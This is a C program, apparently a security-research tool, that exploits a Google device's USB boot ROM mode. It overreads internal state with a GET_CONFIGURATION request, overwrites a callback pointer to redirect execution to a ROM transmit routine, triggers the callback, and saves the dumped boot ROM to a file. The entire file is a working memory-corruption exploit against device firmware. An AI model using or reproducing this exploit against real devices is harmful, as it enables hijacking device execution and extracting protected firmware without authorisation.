#include <libusb.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#define GOOGLE_VID 0x18d1
#define ROM_PID 0x4f00

#define CDC_CONTROL_INTERFACE 0
#define CDC_DATA_INTERFACE 1
#define CDC_EP_OUT 0x02
#define CDC_EP_IN 0x81

#define GET_CONFIGURATION_REQUEST 0x08
#define BUFFER_SIZE 0x8000
#define ROM_SIZE 0xc046

#define STATE_COUNTER_OFFSET 0x480
#define STATE_HANDLER_OFFSET 0x490
#define STATE_CALLBACK_OFFSET 0x500
#define ROM_TRANSMIT_CALL 0x00009c70

static void usage(const char *program) {
    fprintf(stderr, "usage: %s [--output PATH] [--dry-run]\n", program);
}

static int setupCdc(libusb_device_handle *device) {
    int interfaceNumber = CDC_CONTROL_INTERFACE;
    for (; interfaceNumber <= CDC_DATA_INTERFACE; ++interfaceNumber) {
        int result = libusb_kernel_driver_active(device, interfaceNumber);
        if (result == 1) {
            result = libusb_detach_kernel_driver(device, interfaceNumber);
            if (result < 0 && result != LIBUSB_ERROR_NOT_SUPPORTED) {
                fprintf(stderr, "cannot detach usb driver from interface %d: %s\n",
                        interfaceNumber, libusb_error_name(result));
                goto fail;
            }
        }

        result = libusb_claim_interface(device, interfaceNumber);
        if (result < 0) {
            fprintf(stderr, "cannot claim usb interface %d: %s\n",
                    interfaceNumber, libusb_error_name(result));
            goto fail;
        }
    }

    uint8_t lineCoding[] = {0x00, 0xc2, 0x01, 0x00, 0x00, 0x00, 0x08};
    int result = libusb_control_transfer(device, 0x21, 0x20, 0,
                                         CDC_CONTROL_INTERFACE, lineCoding,
                                         sizeof(lineCoding), 500);
    if (result < 0) {
        fprintf(stderr, "cannot configure cdc line coding: %s\n", libusb_error_name(result));
        goto fail;
    }

    result = libusb_control_transfer(device, 0x21, 0x22, 0x0003,
                                     CDC_CONTROL_INTERFACE, NULL, 0, 500);
    if (result < 0) {
        fprintf(stderr, "cannot enable cdc data terminal: %s\n", libusb_error_name(result));
        goto fail;
    }
    return 0;

fail:
    while (interfaceNumber > CDC_CONTROL_INTERFACE) {
        libusb_release_interface(device, --interfaceNumber);
    }
    return -1;
}

static void releaseCdc(libusb_device_handle *device) {
    libusb_release_interface(device, CDC_DATA_INTERFACE);
    libusb_release_interface(device, CDC_CONTROL_INTERFACE);
}

static libusb_device_handle *waitForRom(libusb_context *context) {
    fputs("waiting for ROM mode (18d1:4f00) ...\n", stderr);
    for (;;) {
        libusb_device_handle *device = libusb_open_device_with_vid_pid(
            context, GOOGLE_VID, ROM_PID);
        if (device != NULL) {
            return device;
        }
        usleep(250000);
    }
}

static void writeLe32(uint8_t *buffer, uint32_t value) {
    buffer[0] = (uint8_t)value;
    buffer[1] = (uint8_t)(value >> 8);
    buffer[2] = (uint8_t)(value >> 16);
    buffer[3] = (uint8_t)(value >> 24);
}

static uint32_t readLe32(const uint8_t *buffer) {
    return (uint32_t)buffer[0] |
           ((uint32_t)buffer[1] << 8) |
           ((uint32_t)buffer[2] << 16) |
           ((uint32_t)buffer[3] << 24);
}

static int readRomState(libusb_device_handle *device, uint8_t *state) {
    int result = libusb_control_transfer(device, 0x80, GET_CONFIGURATION_REQUEST, 0, 0,
                                         state, BUFFER_SIZE, 3000);
    if (result < 0) {
        fprintf(stderr, "GET_CONFIGURATION overread failed: %s\n", libusb_error_name(result));
        return -1;
    }
    if (result < STATE_CALLBACK_OFFSET + 4) {
        fprintf(stderr, "short state: %d bytes, need at least 0x%x\n",
                result, STATE_CALLBACK_OFFSET + 4);
        return -1;
    }
    fprintf(stderr, "state: %d bytes, counter=%02x handler=%08x callback=%08x\n",
            result, state[STATE_COUNTER_OFFSET], readLe32(state + STATE_HANDLER_OFFSET),
            readLe32(state + STATE_CALLBACK_OFFSET));
    return 0;
}

static int overwriteCallback(libusb_device_handle *device, uint8_t *state) {
    state[STATE_COUNTER_OFFSET] = (uint8_t)((state[STATE_COUNTER_OFFSET] + 4) & 0x1f);
    writeLe32(state + STATE_CALLBACK_OFFSET, ROM_TRANSMIT_CALL);

    int result = libusb_control_transfer(device, 0x00, GET_CONFIGURATION_REQUEST, 0, 0,
                                         state, BUFFER_SIZE, 3000);
    if (result != LIBUSB_ERROR_PIPE && result != LIBUSB_ERROR_TIMEOUT) {
        fprintf(stderr, "GET_CONFIGURATION overwrite failed: %s\n",
                libusb_error_name(result));
        return -1;
    }
    fprintf(stderr, "callback replay: %s, listening for cdc output\n",
            libusb_error_name(result));
    return 0;
}

static void triggerCallback(libusb_device_handle *device) {
    uint8_t padding[512] = {0};
    int transferred = 0;
    int result = libusb_bulk_transfer(device, CDC_EP_OUT, padding, sizeof(padding),
                                      &transferred, 1500);
    fprintf(stderr, "bulk-out trigger: %s, %d/%zu bytes\n", libusb_error_name(result),
            transferred, sizeof(padding));
}

static ssize_t findRomStart(const uint8_t *buffer, size_t length) {
    static const uint8_t resetVector[] = {0x02, 0x00, 0x00, 0x14};
    for (size_t offset = 0; offset + sizeof(resetVector) <= length; ++offset) {
        if (memcmp(buffer + offset, resetVector, sizeof(resetVector)) == 0) {
            return (ssize_t)offset;
        }
    }
    return -1;
}

static int dumpBulkIn(libusb_device_handle *device, const char *outputPath) {
    uint8_t buffer[BUFFER_SIZE];
    FILE *output = fopen(outputPath, "wb");
    if (output == NULL) {
        perror(outputPath);
        return -1;
    }

    int status = -1;
    bool foundRom = false;
    size_t total = 0;
    int emptyReads = 0;
    while (emptyReads < 3) {
        int received = 0;
        int result = libusb_bulk_transfer(device, CDC_EP_IN, buffer, sizeof(buffer),
                                          &received, 1500);
        if (result == LIBUSB_ERROR_TIMEOUT) {
            ++emptyReads;
            continue;
        }
        if (result < 0) {
            if (foundRom && total >= ROM_SIZE) {
                break;
            }
            fprintf(stderr, "bulk read failed: %s\n", libusb_error_name(result));
            goto done;
        }
        if (received == 0) {
            ++emptyReads;
            continue;
        }
        emptyReads = 0;

        size_t offset = 0;
        if (!foundRom) {
            ssize_t start = findRomStart(buffer, (size_t)received);
            if (start < 0) {
                fprintf(stderr, "discarded %d-byte cdc message\n", received);
                continue;
            }
            foundRom = true;
            offset = (size_t)start;
            fprintf(stderr, "aaaand here we go :3 (cdc offset %zu)\n", offset);
        }

        size_t left = (size_t)received - offset;
        if (fwrite(buffer + offset, 1, left, output) != left) {
            perror("write");
            goto done;
        }
        total += left;
        fprintf(stderr, "received %zu bytes\r", total);
    }
    fputc('\n', stderr);
    if (!foundRom) {
        fputs("no reset vector received\n", stderr);
        goto done;
    }
    if (total < ROM_SIZE) {
        fprintf(stderr, "short dump: %zu bytes, expected at least 0x%x\n", total, ROM_SIZE);
        goto done;
    }
    status = 0;

done:
    if (fclose(output) != 0) {
        perror(outputPath);
        return -1;
    }
    if (status != 0) {
        return status;
    }
    fprintf(stderr, "saved %zu bytes to %s\n", total, outputPath);
    return 0;
}

int main(int argc, char **argv) {
    const char *outputPath = "bootrom.bin";
    bool dryRun = false;
    for (int index = 1; index < argc; ++index) {
        if (strcmp(argv[index], "--help") == 0) {
            usage(argv[0]);
            return 0;
        } else if (strcmp(argv[index], "--output") == 0 && index + 1 < argc) {
            outputPath = argv[++index];
        } else if (strcmp(argv[index], "--dry-run") == 0) {
            dryRun = true;
        } else {
            usage(argv[0]);
            return 2;
        }
    }

    if (dryRun) {
        printf("GET_CONFIGURATION replay: counter[0x%x] = (counter + 4) & 0x1f; "
               "callback[0x%x] = 0x%08x; capture CDC EP 0x%02x\n",
               STATE_COUNTER_OFFSET, STATE_CALLBACK_OFFSET, ROM_TRANSMIT_CALL, CDC_EP_IN);
        return 0;
    }

    libusb_context *context = NULL;
    int result = libusb_init(&context);
    if (result < 0) {
        fprintf(stderr, "libusb init failed: %s\n", libusb_error_name(result));
        return 1;
    }

    libusb_device_handle *device = waitForRom(context);
    uint8_t state[BUFFER_SIZE] = {0};
    result = setupCdc(device);
    if (result != 0) {
        goto done;
    }

    result = readRomState(device, state);
    if (result == 0) {
        result = overwriteCallback(device, state);
    }
    if (result == 0) {
        triggerCallback(device);
        result = dumpBulkIn(device, outputPath);
    }
    releaseCdc(device);

done:
    libusb_close(device);
    libusb_exit(context);
    return result == 0 ? 0 : 1;
}
